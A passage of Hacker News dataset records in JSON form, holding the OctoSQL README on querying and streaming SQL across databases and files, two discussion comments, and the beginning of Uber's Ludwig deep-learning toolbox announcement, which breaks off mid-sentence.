are a heuristic which try to approximate the \"current time\" when processing events. Said differently: When I receive a watermark for 12:00 I can be sure enough I've received all events of interest up to 12:00. To achieve this, they are generated at streaming sources and propagate downstream through the whole processing pipeline. The generation of watermarks usually relies on heuristics which provide satisfactory results for our given use case. OctoSQL currently contains the following watermark generators: Maximum difference watermark generator (with an offset argument) With an offset of 10 seconds, this generator says: When I've received an event for 12:00:00, then I'm sure I won't receive any event older than 11:59:50. Percentile watermark generator (with a percentile argument) With a percentile of 99.5, it will look at a specified number of recent events, and generate a watermark so that 99.5% of those events are after the watermark (not yet triggered), and the remaining 0.5% are before it. This way we set the watermark so that only a fraction of the recently seen events is potentially ignored as being late. Watermark generators are specified using table valued functions and are documented in the wiki. Triggers Another matter is triggering of keys in aggregations. Sometimes you'd like to only see the value for a given key (hour) when you know it's done, but othertimes you'd like to see partial results (how's the unique user count going this hour). That's where you can use triggers. Triggers allow you to specify when a given aggregate (or join window for that matter) is emitted or updated. OctoSQL contains multiple triggers: Watermark Trigger This is the most straightforward trigger. It emits a value whenever the watermark for a given key (or the end of the stream) is reached. So basically the \"show me when it's done\". Counting Trigger (with a count argument) This trigger will emit a value for a key every time it receives count records with this key. The count is reset whenever the key is triggered. Delay Trigger (with a delay argument) This trigger will emit a value for a key whenever the key has been inactive for the delay period. You can use multiple triggers simultaneously. (Show me the current sum every 10 received events, but also the final value after having received the watermark.) Retractions A key can be triggered multiple times with partial results. How do we know a given record is a retriggering of some key, and not a new unrelated record? OctoSQL solves this problem using a dataflow-like architecture. This means whenever a new value is sent for a key, a retraction is send for the old value. In practice this means every update is accompanied by the old record with an undo flag set. This can be visible when using a stream-* output format with partial results. Example Now we can see how it all fits together. In this example we have an events file, which contains records about points being scored in a game by multiple teams. WITH with_watermark AS (SELECT * FROM max_diff_watermark(source=>TABLE(events), offset=>INTERVAL 5 SECONDS, time_field=>DESCRIPTOR(time)) e), with_tumble AS (SELECT * FROM tumble(source=>TABLE(with_watermark), time_field=>DESCRIPTOR(e.time), window_length=> INTERVAL 1 MINUTE, offset => INTERVAL 0 SECONDS) e), counts_per_team AS (SELECT e.window_end, e.team, COUNT(*) as goals FROM with_tumble e GROUP BY e.window_end, e.team TRIGGER COUNTING 100, ON WATERMARK) SELECT * FROM counts_per_team cpt ORDER BY cpt.window_end DESC, cpt.goals ASC, cpt.team DESC We use common table expressions to break the query up into multiple stages. First we create the with_watermark intermediate table/stream. Here we use the table valued function max_diff_watermark to add watermarks to the events table - with an offset of 5 seconds based on the time record field. Then we use this intermediate table to create the with_tumble table, where we use the tumble table valued function to add a window_start and window_end field to each record, based on the record's time field. This assigns the records to 1 minute long windows. Next we create the counts_per_team table, which groups the records by their window end and team. Finally, we order those results by window end, goal count and team. Durability OctoSQL in its current design is based on on-disk transactional storage. All state is saved this way. All interactions with datasources are designed so that no records get duplicated in the face of errors or application restarts. You can also kill the OctoSQL process and start it again with the same query and storage-directory (command line argument), it will start where it left off. By default, OctoSQL will create a temporary directory for the state and delete it after termination. Configuration The configuration file has the following form dataSources: - name: <table_name_in_octosql> type: <datasource_type> config: <datasource_specific_key>: <datasource_specific_value> <datasource_specific_key>: <datasource_specific_value> ... - name: <table_name_in_octosql> type: <datasource_type> config: <datasource_specific_key>: <datasource_specific_value> <datasource_specific_key>: <datasource_specific_value> ... ... physical: physical_plan_option: <value> Available OctoSQL-wide configuration options are: physical groupByParallelism: The parallelism of group by's and distinct queries. Will default to the CPU core count of your machine. streamJoinParallelism: The parallelism of streaming joins. Will default to the CPU core count of your machine. execution lookupJoinPrefetchCount: The count of simultaneously processed records in a lookup join. Supported Datasources JSON JSON file in one of the following forms: one record per line, no commas JSON list of records options: path - path to file containing the data, required arrayFormat - if the JSON list of records format should be used, optional: defaults to false batchSize - number of records extracted from json file in one storage transaction, optional: defaults to 1000 CSV CSV file separated using commas. The file may or may not have column names as it's first row. options: path - path to file containing the data, required headerRow - whether the first row of the CSV file contains column names or not, optional: defaults to true separator - columns separator, optional: defaults to \",\" batchSize - number of records extracted from csv file in one storage transaction, optional: defaults to 1000 Excel A single table in an Excel spreadsheet. The table may or may not have column names as it's first row. The table can be in any sheet, and start at any point, but it cannot contain spaces between columns nor spaces between rows. options: path - path to file, required headerRow - does the first row contain column names, optional: defaults to true sheet - name of the sheet in which data is stored, optional: defaults to \"Sheet1\" rootCell - name of cell (i.e \"A3\", \"BA14\") which is the leftmost cell of the first, optional: defaults to \"A1\" timeColumns - a list of columns to parse as datetime values with second precision row, optional: defaults to [] batchSize - number of records extracted from excel file in one storage transaction, optional: defaults to 1000 Parquet A single Parquet file. Nested repeated elements are not supported. Otherwise repeated xor nested elements are supported. Currently unsupported logical types, they will get parsed as the underlying primitive type: - ENUM - TIME with NANOS precision - TIMESTAMP with NANOS precision (both UTC and non-UTC) - INTERVAL - MAP options path - path to file, required batchSize - number of records extracted from parquet file in one storage transaction, optional: defaults to 1000 PostgreSQL Single PostgreSQL database table. options: address - address including port number, optional: defaults to localhost:5432 user - required password - required databaseName - required tableName - required batchSize - number of records extracted from PostgreSQL database in one storage transaction, optional: defaults to 1000 MySQL Single MySQL database table. options: address - address including port number, optional: defaults to localhost:3306 user - required password - required databaseName - required tableName - required batchSize - number of records extracted from MySQL database in one storage transaction, optional: defaults to 1000 Redis Redis database with the given index. Currently only hashes are supported. options: address - address including port number, optional: defaults to localhost:6379 password - optional: defaults to \"\" databaseIndex - index number of Redis database, optional: defaults to 0 databaseKeyName - column name of Redis key in OctoSQL records, optional: defaults to \"key\" batchSize - number of records extracted from Redis database in one storage transaction, optional: defaults to 1000 Kafka Multi-partition kafka topic. optional brokers - list of broker addresses (separately hosts and ports) used to connect to the kafka cluster, optional: defaults to [\"localhost:9092\"] topic - name of topic to read messages from, required partitions - topic partition count, optional: defaults to 1 startOffset - offset from which the first batch of messages will be read, optional: defaults to -1 batchSize - number of records extracted from Kafka in one storage transaction, optional: defaults to 1 json - should the messages be decoded as JSON, optional: defaults to false Documentation Documentation for the available functions: https://github.com/cube2222/octosql/wiki/Function-Documentation Documentation for the available aggregates: https://github.com/cube2222/octosql/wiki/Aggregate-Documentation Documentation for the available triggers: https://github.com/cube2222/octosql/wiki/Trigger-Documentation Documentation for the available table valued functions: https://github.com/cube2222/octosql/wiki/Table-Valued-Functions-Documentation The SQL dialect documentation: TODO ;) in short though: Available SQL constructs: Select, Where, Order By, Group By, Offset, Limit, Left Join, Right Join, Inner Join, Distinct, Union, Union All, Subqueries, Operators, Table Valued Functions, Trigger, Common Table Expressions. Available SQL types: Int, Float, String, Bool, Time, Duration, Tuple (array), Object (e.g. JSON) Describe You can describe the current plan in graphviz format using the -describe flag, like this: octosql \"...\" --describe | dot -Tpng > output.png Architecture An OctoSQL invocation gets processed in multiple phases. SQL AST First, the SQL query gets parsed into an abstract syntax tree. This phase only rules out syntax errors. Logical Plan The SQL AST gets converted into a logical query plan. This plan is still mostly a syntactic validation. It's the most naive possible translation of the SQL query. However, this plan already has more of a map-filter-reduce form. If you wanted to add a new query language to OctoSQL, the only problem you'd have to solve is translating it to this logical plan. Physical Plan The logical plan gets converted into a physical plan. This conversion finds any semantic errors in the query. If this phase is reached, then the input is correct and OctoSQL will be able execute it. This phase already understands the specifics of the underlying datasources. So it's here where the optimizer will iteratively transform the plan, pushing computation nodes down to the datasources, and deduplicating unnecessary parts. The optimizer uses a pattern matching approach, where it has rules for matching parts of the physical plan tree and how those patterns can be restructured into a more efficient version. The rules are meant to be as simple as possible and make the smallest possible changes. For example, pushing filters under maps, if they don't use any mapped variables. This way, the optimizer just keeps on iterating on the whole tree, until it can't change anything anymore. (each iteration tries to apply each rule in each possible place in the tree) This ensures that the plan reaches a local performance minimum, and the rules should be structured so that this local minimum is equal - or close to - the global minimum. (i.e. one optimization, shouldn't make another - much more useful one - impossible) Here is an example diagram of an optimized physical plan: Execution Plan The physical plan gets materialized into an execution plan. This phase has to be able to connect to the actual datasources. It may initialize connections, open files, etc. Stream Starting the execution plan creates a stream, which underneath may hold more streams, or parts of the execution plan to create streams in the future. This stream works in a pull based model. Datasource Pushdown Operations Datasource Equality In > < <= >= MySQL supported supported supported PostgreSQL supported supported supported Redis supported supported scan Kafka scan scan scan Parquet scan scan scan JSON scan scan scan CSV scan scan scan Where scan means that the whole table needs to be scanned for each access. Telemetry OctoSQL sends application telemetry on each run to help us gauge user interest and feature use. This way we know somebody uses our software, feel our work is actually useful and can prioritize features based on actual usefulness. You can turn it off (though please don't) by setting the OCTOSQL_TELEMETRY environment variable to 0. Telemetry is also fully printed in the output log of OctoSQL, if you want to see what precisely is being sent. Roadmap Additional Datasources. SQL Constructs: JSON Query HAVING, ALL, ANY Push down functions, aggregates to databases that support them. An in-memory index to save values of subqueries and save on rescanning tables which don't support a given operation, so as not to recalculate them each time. Runtime statistics Server mode Querying a json or csv table from standard input. Integration test suite Tuple splitter, returning the row for each tuple element, with the given element instead of the tuple. ",
          "Hey, one of the authors here.<p>The motivation behind this project is that I always wanted a simple commandline tool allowing me to join data from different places, without needing to set up stuff like presto or spark. On another hand, I never encountered any tool which allows me to easily query csv and json data using SQL (which at least in my opinion is fairly ergonomic to use).<p>This started as an university project, but we're now continuing it as an open source one, as it's been a great success so far.<p>Anyways, feedback greatly requested and appreciated!",
          "Really cool, thanks for sharing. You all might want to look at Apache Calcite (<a href=\"http://calcite.apache.org/\" rel=\"nofollow\">http://calcite.apache.org/</a>) as well for inspiration, which has similar functionality as a subset of its features!"
        ],
        "story_type": ["ShowHN"],
        "url": "https://github.com/cube2222/octosql",
        "comments.comment_id": [20449703, 20450152],
        "comments.comment_author": ["cube2222", "MoOmer"],
        "comments.comment_descendants": [12, 3],
        "comments.comment_time": [
          "2019-07-16T13:16:54Z",
          "2019-07-16T14:11:16Z"
        ],
        "comments.comment_text": [
          "Hey, one of the authors here.<p>The motivation behind this project is that I always wanted a simple commandline tool allowing me to join data from different places, without needing to set up stuff like presto or spark. On another hand, I never encountered any tool which allows me to easily query csv and json data using SQL (which at least in my opinion is fairly ergonomic to use).<p>This started as an university project, but we're now continuing it as an open source one, as it's been a great success so far.<p>Anyways, feedback greatly requested and appreciated!",
          "Really cool, thanks for sharing. You all might want to look at Apache Calcite (<a href=\"http://calcite.apache.org/\" rel=\"nofollow\">http://calcite.apache.org/</a>) as well for inspiration, which has similar functionality as a subset of its features!"
        ],
        "id": "1eccd8b1-2c6f-4582-9f82-46116daa8caf",
        "url_text": "OctoSQL is a query tool that allows you to join, analyse and transform data from multiple databases, streaming sources and file formats using SQL. OctoSQL is currently being rewritten on the redesign branch. Problems OctoSQL Solves You need to join / analyze data from multiple datasources. Think of enriching an Excel file by joining it with a PostgreSQL database. You need stream aggregates over time, with live output updates. Think of a live-updated leaderboard with cat images based on a \"like\" event stream. You need aggregate streams per time window, with live output updates. Think of a unique user count per hour, per country live summary. Table of Contents What is OctoSQL? Installation Quickstart Temporal SQL Features Watermarks Triggers Retractions Example Durability Configuration JSON CSV Excel Parquet PostgreSQL MySQL Redis Kafka Documentation Architecture Datasource Pushdown Operations Roadmap What is OctoSQL? OctoSQL is a SQL query engine which allows you to write standard SQL queries on data stored in multiple SQL databases, NoSQL databases, streaming sources and files in various formats trying to push down as much of the work as possible to the source databases, not transferring unnecessary data. OctoSQL does that by creating an internal representation of your query and later translating parts of it into the query languages or APIs of the source databases. Whenever a datasource doesn't support a given operation, OctoSQL will execute it in memory, so you don't have to worry about the specifics of the underlying datasources. OctoSQL also includes temporal SQL extensions, to operate ergonomically on streams and respect their event-time (not the current system-time when the records are being processed). With OctoSQL you don't need O(n) client tools or a large data analysis system deployment. Everything's contained in a single binary. Why the name? OctoSQL stems from Octopus SQL. Octopus, because octopi have many arms, so they can grasp and manipulate multiple objects, like OctoSQL is able to handle multiple datasources simultaneously. Installation Either download the binary for your operating system (Linux, OS X and Windows are supported) from the Releases page, or install using the go command line tool: GO111MODULE=on go get -u github.com/cube2222/octosql/cmd/octosql Quickstart Let's say we have a csv file with cats, and a redis database with people (potential cat owners). Now we want to get a list of cities with the number of distinct cat names in them and the cumulative number of cat lives (as each cat has up to 9 lives left). First, create a configuration file (Configuration Syntax) For example: dataSources: - name: cats type: csv config: path: \"~/Documents/cats.csv\" - name: people type: redis config: address: \"localhost:6379\" password: \"\" databaseIndex: 0 databaseKeyName: \"id\" Then, set the OCTOSQL_CONFIG environment variable to point to the configuration file. export OCTOSQL_CONFIG=~/octosql.yaml You can also use the --config command line argument. Finally, query to your hearts desire: octosql \"SELECT p.city, FIRST(c.name), COUNT(DISTINCT c.name) cats, SUM(c.livesleft) catlives FROM cats c JOIN people p ON c.ownerid = p.id GROUP BY p.city ORDER BY catlives DESC LIMIT 9\" Example output: +---------+--------------+------+----------+ | p.city | c.name_first | cats | catlives | +---------+--------------+------+----------+ | Warren | Zoey | 68 | 570 | | Gadsden | Snickers | 52 | 388 | | Staples | Harley | 54 | 383 | | Buxton | Lucky | 45 | 373 | | Bethany | Princess | 46 | 366 | | Noxen | Sheba | 49 | 361 | | Yorklyn | Scooter | 45 | 359 | | Tuttle | Toby | 57 | 356 | | Ada | Jasmine | 49 | 351 | +---------+--------------+------+----------+ You can choose between live-table batch-table live-csv batch-csv stream-json output formats. (The live-* types will update the terminal view repeatedly every second, the batch-* ones will write the output once before exiting, the stream-* ones will print records whenever they are available) Temporal SQL Features OctoSQL features temporal SQL extensions inspired by the paper One SQL to Rule Them All. Introduction Often when you're working with streams of events, you'd like to use the time dimension somehow: Calculate average values for a day sliced by hours. Get unique user counts per day. and others All those examples have one thing in common: The time value of an event is crucial for correctness. A naive system could just use the current clock time whenever it receives an event. The correctness of this approach however, degrades quickly in the face of network problems, delivery delays, clock skew. This can be solved by using a value from the event as its time value. A new problem arises though: how do I know that I've received all events up to time X and can publish results for a given hour. You never know if there isn't somewhere a delayed event which should be factored in. This is where watermarks come into play. Watermarks Watermarks are a heuristic which try to approximate the \"current time\" when processing events. Said differently: When I receive a watermark for 12:00 I can be sure enough I've received all events of interest up to 12:00. To achieve this, they are generated at streaming sources and propagate downstream through the whole processing pipeline. The generation of watermarks usually relies on heuristics which provide satisfactory results for our given use case. OctoSQL currently contains the following watermark generators: Maximum difference watermark generator (with an offset argument) With an offset of 10 seconds, this generator says: When I've received an event for 12:00:00, then I'm sure I won't receive any event older than 11:59:50. Percentile watermark generator (with a percentile argument) With a percentile of 99.5, it will look at a specified number of recent events, and generate a watermark so that 99.5% of those events are after the watermark (not yet triggered), and the remaining 0.5% are before it. This way we set the watermark so that only a fraction of the recently seen events is potentially ignored as being late. Watermark generators are specified using table valued functions and are documented in the wiki. Triggers Another matter is triggering of keys in aggregations. Sometimes you'd like to only see the value for a given key (hour) when you know it's done, but othertimes you'd like to see partial results (how's the unique user count going this hour). That's where you can use triggers. Triggers allow you to specify when a given aggregate (or join window for that matter) is emitted or updated. OctoSQL contains multiple triggers: Watermark Trigger This is the most straightforward trigger. It emits a value whenever the watermark for a given key (or the end of the stream) is reached. So basically the \"show me when it's done\". Counting Trigger (with a count argument) This trigger will emit a value for a key every time it receives count records with this key. The count is reset whenever the key is triggered. Delay Trigger (with a delay argument) This trigger will emit a value for a key whenever the key has been inactive for the delay period. You can use multiple triggers simultaneously. (Show me the current sum every 10 received events, but also the final value after having received the watermark.) Retractions A key can be triggered multiple times with partial results. How do we know a given record is a retriggering of some key, and not a new unrelated record? OctoSQL solves this problem using a dataflow-like architecture. This means whenever a new value is sent for a key, a retraction is send for the old value. In practice this means every update is accompanied by the old record with an undo flag set. This can be visible when using a stream-* output format with partial results. Example Now we can see how it all fits together. In this example we have an events file, which contains records about points being scored in a game by multiple teams. WITH with_watermark AS (SELECT * FROM max_diff_watermark(source=>TABLE(events), offset=>INTERVAL 5 SECONDS, time_field=>DESCRIPTOR(time)) e), with_tumble AS (SELECT * FROM tumble(source=>TABLE(with_watermark), time_field=>DESCRIPTOR(e.time), window_length=> INTERVAL 1 MINUTE, offset => INTERVAL 0 SECONDS) e), counts_per_team AS (SELECT e.window_end, e.team, COUNT(*) as goals FROM with_tumble e GROUP BY e.window_end, e.team TRIGGER COUNTING 100, ON WATERMARK) SELECT * FROM counts_per_team cpt ORDER BY cpt.window_end DESC, cpt.goals ASC, cpt.team DESC We use common table expressions to break the query up into multiple stages. First we create the with_watermark intermediate table/stream. Here we use the table valued function max_diff_watermark to add watermarks to the events table - with an offset of 5 seconds based on the time record field. Then we use this intermediate table to create the with_tumble table, where we use the tumble table valued function to add a window_start and window_end field to each record, based on the record's time field. This assigns the records to 1 minute long windows. Next we create the counts_per_team table, which groups the records by their window end and team. Finally, we order those results by window end, goal count and team. Durability OctoSQL in its current design is based on on-disk transactional storage. All state is saved this way. All interactions with datasources are designed so that no records get duplicated in the face of errors or application restarts. You can also kill the OctoSQL process and start it again with the same query and storage-directory (command line argument), it will start where it left off. By default, OctoSQL will create a temporary directory for the state and delete it after termination. Configuration The configuration file has the following form dataSources: - name: <table_name_in_octosql> type: <datasource_type> config: <datasource_specific_key>: <datasource_specific_value> <datasource_specific_key>: <datasource_specific_value> ... - name: <table_name_in_octosql> type: <datasource_type> config: <datasource_specific_key>: <datasource_specific_value> <datasource_specific_key>: <datasource_specific_value> ... ... physical: physical_plan_option: <value> Available OctoSQL-wide configuration options are: physical groupByParallelism: The parallelism of group by's and distinct queries. Will default to the CPU core count of your machine. streamJoinParallelism: The parallelism of streaming joins. Will default to the CPU core count of your machine. execution lookupJoinPrefetchCount: The count of simultaneously processed records in a lookup join. Supported Datasources JSON JSON file in one of the following forms: one record per line, no commas JSON list of records options: path - path to file containing the data, required arrayFormat - if the JSON list of records format should be used, optional: defaults to false batchSize - number of records extracted from json file in one storage transaction, optional: defaults to 1000 CSV CSV file separated using commas. The file may or may not have column names as it's first row. options: path - path to file containing the data, required headerRow - whether the first row of the CSV file contains column names or not, optional: defaults to true separator - columns separator, optional: defaults to \",\" batchSize - number of records extracted from csv file in one storage transaction, optional: defaults to 1000 Excel A single table in an Excel spreadsheet. The table may or may not have column names as it's first row. The table can be in any sheet, and start at any point, but it cannot contain spaces between columns nor spaces between rows. options: path - path to file, required headerRow - does the first row contain column names, optional: defaults to true sheet - name of the sheet in which data is stored, optional: defaults to \"Sheet1\" rootCell - name of cell (i.e \"A3\", \"BA14\") which is the leftmost cell of the first, optional: defaults to \"A1\" timeColumns - a list of columns to parse as datetime values with second precision row, optional: defaults to [] batchSize - number of records extracted from excel file in one storage transaction, optional: defaults to 1000 Parquet A single Parquet file. Nested repeated elements are not supported. Otherwise repeated xor nested elements are supported. Currently unsupported logical types, they will get parsed as the underlying primitive type: - ENUM - TIME with NANOS precision - TIMESTAMP with NANOS precision (both UTC and non-UTC) - INTERVAL - MAP options path - path to file, required batchSize - number of records extracted from parquet file in one storage transaction, optional: defaults to 1000 PostgreSQL Single PostgreSQL database table. options: address - address including port number, optional: defaults to localhost:5432 user - required password - required databaseName - required tableName - required batchSize - number of records extracted from PostgreSQL database in one storage transaction, optional: defaults to 1000 MySQL Single MySQL database table. options: address - address including port number, optional: defaults to localhost:3306 user - required password - required databaseName - required tableName - required batchSize - number of records extracted from MySQL database in one storage transaction, optional: defaults to 1000 Redis Redis database with the given index. Currently only hashes are supported. options: address - address including port number, optional: defaults to localhost:6379 password - optional: defaults to \"\" databaseIndex - index number of Redis database, optional: defaults to 0 databaseKeyName - column name of Redis key in OctoSQL records, optional: defaults to \"key\" batchSize - number of records extracted from Redis database in one storage transaction, optional: defaults to 1000 Kafka Multi-partition kafka topic. optional brokers - list of broker addresses (separately hosts and ports) used to connect to the kafka cluster, optional: defaults to [\"localhost:9092\"] topic - name of topic to read messages from, required partitions - topic partition count, optional: defaults to 1 startOffset - offset from which the first batch of messages will be read, optional: defaults to -1 batchSize - number of records extracted from Kafka in one storage transaction, optional: defaults to 1 json - should the messages be decoded as JSON, optional: defaults to false Documentation Documentation for the available functions: https://github.com/cube2222/octosql/wiki/Function-Documentation Documentation for the available aggregates: https://github.com/cube2222/octosql/wiki/Aggregate-Documentation Documentation for the available triggers: https://github.com/cube2222/octosql/wiki/Trigger-Documentation Documentation for the available table valued functions: https://github.com/cube2222/octosql/wiki/Table-Valued-Functions-Documentation The SQL dialect documentation: TODO ;) in short though: Available SQL constructs: Select, Where, Order By, Group By, Offset, Limit, Left Join, Right Join, Inner Join, Distinct, Union, Union All, Subqueries, Operators, Table Valued Functions, Trigger, Common Table Expressions. Available SQL types: Int, Float, String, Bool, Time, Duration, Tuple (array), Object (e.g. JSON) Describe You can describe the current plan in graphviz format using the -describe flag, like this: octosql \"...\" --describe | dot -Tpng > output.png Architecture An OctoSQL invocation gets processed in multiple phases. SQL AST First, the SQL query gets parsed into an abstract syntax tree. This phase only rules out syntax errors. Logical Plan The SQL AST gets converted into a logical query plan. This plan is still mostly a syntactic validation. It's the most naive possible translation of the SQL query. However, this plan already has more of a map-filter-reduce form. If you wanted to add a new query language to OctoSQL, the only problem you'd have to solve is translating it to this logical plan. Physical Plan The logical plan gets converted into a physical plan. This conversion finds any semantic errors in the query. If this phase is reached, then the input is correct and OctoSQL will be able execute it. This phase already understands the specifics of the underlying datasources. So it's here where the optimizer will iteratively transform the plan, pushing computation nodes down to the datasources, and deduplicating unnecessary parts. The optimizer uses a pattern matching approach, where it has rules for matching parts of the physical plan tree and how those patterns can be restructured into a more efficient version. The rules are meant to be as simple as possible and make the smallest possible changes. For example, pushing filters under maps, if they don't use any mapped variables. This way, the optimizer just keeps on iterating on the whole tree, until it can't change anything anymore. (each iteration tries to apply each rule in each possible place in the tree) This ensures that the plan reaches a local performance minimum, and the rules should be structured so that this local minimum is equal - or close to - the global minimum. (i.e. one optimization, shouldn't make another - much more useful one - impossible) Here is an example diagram of an optimized physical plan: Execution Plan The physical plan gets materialized into an execution plan. This phase has to be able to connect to the actual datasources. It may initialize connections, open files, etc. Stream Starting the execution plan creates a stream, which underneath may hold more streams, or parts of the execution plan to create streams in the future. This stream works in a pull based model. Datasource Pushdown Operations Datasource Equality In > < <= >= MySQL supported supported supported PostgreSQL supported supported supported Redis supported supported scan Kafka scan scan scan Parquet scan scan scan JSON scan scan scan CSV scan scan scan Where scan means that the whole table needs to be scanned for each access. Telemetry OctoSQL sends application telemetry on each run to help us gauge user interest and feature use. This way we know somebody uses our software, feel our work is actually useful and can prioritize features based on actual usefulness. You can turn it off (though please don't) by setting the OCTOSQL_TELEMETRY environment variable to 0. Telemetry is also fully printed in the output log of OctoSQL, if you want to see what precisely is being sent. Roadmap Additional Datasources. SQL Constructs: JSON Query HAVING, ALL, ANY Push down functions, aggregates to databases that support them. An in-memory index to save values of subqueries and save on rescanning tables which don't support a given operation, so as not to recalculate them each time. Runtime statistics Server mode Querying a json or csv table from standard input. Integration test suite Tuple splitter, returning the row for each tuple element, with the given element instead of the tuple. ",
        "_version_": 1718527415321362433
      },
      {
        "story_id": [19141001],
        "story_author": ["beefman"],
        "story_descendants": [28],
        "story_score": [177],
        "story_time": ["2019-02-12T04:16:17Z"],
        "story_title": "Ludwig, a code-free deep learning toolbox",
        "search": [
          "Ludwig, a code-free deep learning toolbox",
          "https://eng.uber.com/introducing-ludwig/",
          "Over the last decade, deep learning models have proven highly effective at performing a wide variety of machine learning tasks in vision, speech, and language. At Uber we are using these models for a variety of tasks, including customer support, object detection, improving maps, streamlining chat communications, forecasting, and preventing fraud. Many open source libraries, including TensorFlow, PyTorch, CNTK, MXNET, and Chainer, among others, have implemented the building blocks needed to build such models, allowing for faster and less error-prone development. This, in turn, has propelled the adoption of such models both by the machine learning research community and by industry practitioners, resulting in fast progress in both architecture design and industrial solutions. At Uber AI, we decided to avoid reinventing the wheel and to develop packages built on top of the strong foundations open source libraries provide. To this end, in 2017 we released Pyro, a deep probabilistic programming language built on PyTorch, and continued to improve it with the help of the open source community. Another major open source AI tool created by Uber is Horovod, a framework hosted by the LF Deep Learning Foundation that allows distributed training of deep learning models over multiple GPUs and several machines. Extending our commitment to making deep learning more accessible, we are releasing Ludwig, an open source, deep learning toolbox built on top of TensorFlow that allows users to train and test deep learning models without writing code. Ludwig is unique in its ability to help make deep learning easier to understand for non-experts and enable faster model improvement iteration cycles for experienced machine learning developers and researchers alike. By using Ludwig, experts and researchers can simplify the prototyping process and streamline data processing so that they can focus on developing deep learning architectures rather than data wrangling. Ludwig We have been developing Ludwig internally at Uber over the past two years to streamline and simplify the use of deep learning models in applied projects, as they usually require comparisons among different architectures and fast iteration. We have witnessed its value to several of Ubers own projects, including our Customer Obsession Ticket Assistant (COTA), information extraction from driver licenses, identification of points of interest during conversations between driver-partners and riders, food delivery time prediction, and much more. For this reason we decided to release it as open source, as we believe there is no other solution currently available with the same ease of use and flexibility. We originally designed Ludwig as a generic tool for simplifying the model development and comparison process when dealing with new applied machine learning problems. In order to do so, we drew inspiration from other machine learning software: from Wekaand MLlib, the idea of working directly with raw data and providing a certain number of pre-built models; from Caffe, the declarative nature of the definition file; and from scikit-learn, its simple programmatic API. This mix of influences makes it a pretty different tool from the usual deep learning libraries that provide tensor algebra primitives and few other utilities to code models, while at the same time making it more general than other specialized libraries like PyText, StanfordNLP, AllenNLP, and OpenCV. Ludwig provides a set of model architectures that can be combined together to create an end-to-end model for a given use case. As an analogy, if deep learning libraries provide the building blocks to make your building, Ludwig provides the buildings to make your city, and you can chose among the available buildings or add your own building to the set of available ones. The core design principles we baked into the toolbox are: No coding required: no coding skills are required to train a model and use it for obtaining predictions. Generality: a new data type-based approach to deep learning model design that makes the tool usable across many different use cases. Flexibility: experienced users have extensive control over model building and training, while newcomers will find it easy to use. Extensibility: easy to add new model architecture and new feature data types. Understandability: deep learning model internals are often considered black boxes, but we provide standard visualizations to understand their performance and compare their predictions. Ludwig allows its users to train a deep learning model by providing just a tabular file (like CSV) containing the data and a YAML configuration file that specifies which columns of the tabular file are input features and which are output target variables. The simplicity of the configuration file enables faster prototyping, potentially reducing hours of coding down to a few minutes. If more than one output target variable is specified, Ludwig will perform multi-task learning, learning to predict all the outputs simultaneously, a task that usually requires custom code. The model definition can contain additional information, in particular preprocessing information for each feature in the dataset, which encoder or decoder to use for each feature, architectural parameters for each encoder and decoder, and training parameters. Default values of preprocessing, training, and various model architecture parameters are chosen based on our experience or are adapted from the academic literature, allowing novices to easily train complex models. At the same time, the ability to set each of them individually in the model configuration file offers full flexibility to experts. Each model trained with Ludwig is saved and can be loaded at a later time to obtain predictions on new data. As an example, models can be loaded in a serving environment to provide predictions in software applications. Figure 1: Several input and output features may be specified in Ludwigs model description file, and their combination covers many machine learning tasks. The main new idea that Ludwig introduces is the notion of data type-specific encoders and decoders, which results in a highly modularized and extensible architecture: each type of data supported (text, images, categories, and so on) has a specific preprocessing function. In short, encoders map the raw data to tensors, and decoders map tensors to the raw data. With this design, the user has access to combiners (glue components of the architecture) that combine the tensors from all input encoders, process them, and return the tensors to be used for the output decoders. For instance, Ludwigs default concat combiner concatenates the outputs of different encoders, passes them through fully connected layers, and provides the final activation as input for output decoders. Other combiners are available for other use cases, and many more can be easily added by implementing a simple function interface. By composing these data type-specific components, users can make Ludwig train models on a wide variety of tasks. For example, by combining a text encoder and a category decoder, the user can obtain a text classifier, while combining an image encoder and a text decoder will enable the user to obtain an image captioning model. Each data type may have more than one encoder and decoder. For instance, text can be encoded with a convolutional neural network (CNN), a recurrent neural network (RNN), or other encoders. The user can then specify which one to use and its hyperparameters directly in the model definition file without having to write a single line of code. This versatile and flexible encoder-decoder architecture makes it easy for less experienced deep learning practitioners to train models for diverse machine learning tasks, such as text classification, object classification, image captioning, sequence tagging, regression, language modeling, machine translation, time series forecasting, and question answering. This opens up a variety of use cases that would typically be out of reach forinexperienced practitioners, and allows users experienced in one domain to approach new domains. At the moment, Ludwig contains encoders and decoders for binary values, float numbers, categories, discrete sequences, sets, bags, images, text, and time series, together with the capability to load some pre-trained models (for instance word embeddings), but we plan to expand the supported data types in future releases. In addition to its accessibility and flexible architecture, Ludwig also offers additional benefits for non-programmers. Ludwig incorporates a set of command line utilities for training, testing models, and obtaining predictions. Furthering its ease-of-use, the toolbox provides a programmatic API that allows users to train and use a model with just a couple lines of code. Additionally, it includes a suite of other tools for evaluating models, comparing their performance and predictions through visualizations and extracting both model weights and activations from them. Finally, the ability to train models on multiple GPUs locally and in a distributed fashion through the use of Horovod, an open source distributed training framework, makes it possible to iterate on models and obtain results quickly. Using Ludwig To better understand how to use Ludwig for real-world applications, lets build a simple model with the toolbox. In this example, we create a model that predicts a books genre and price given its title, author, description, and cover. Training the model Our book dataset looks like the following: title author description cover genre price Do Androids Dream of Electric Sheep? Philip K. Dick By 2021, the World War has killed millions, driving entire species into extinction and sending mankind off-planet. path-to-image/do-android-cover.jpg sci-fi 9.32 War and Peace Leo Tolstoy War and Peace broadly focuses on Napoleons invasion of Russia in 1812 and follows three of the most well-known characters in literature path-to-image/war-and-peace-cover.jpg historical 5.42 The Name of the Rose Umberto Eco In 1327, Brother William of Baskerville is sent to investigate a wealthy Italian abbey whose monks are suspected of heresy. .. path-to-image/name-of-the-rose-cover.jpg historical 16.99 In order to learn a model that uses the content of the title, author, description, and cover columns as inputs to predict the values in the genre and price columns, the model definition YAML would be: input_features: name: title type: text name: author type: category name: description type: text name: cover type: image output_features: name: genre type: category name: price type: numerical training: epochs: 10 We start the training by typing the following command in our console: ludwig train data_csv path/to/file.csv model_definition_file model_definition.yaml With this command, Ludwig performs a random split of the data in training, validation, and test sets, preprocess them, and builds four different encoders for the four inputs and one combiner and two decoders for the two output targets. Then, it trains the model on the training set until the accuracy on the validation set stops improving or the maximum number of ten epochs is reached. Training progress will be displayed in the console, but TensorBoard can also be used. Text features are encoded by default with a CNN encoder, but we could use, say, an RNN encoder that uses a a bidirectional LSTM with a state size of 200 for encoding the title instead. We would only need to 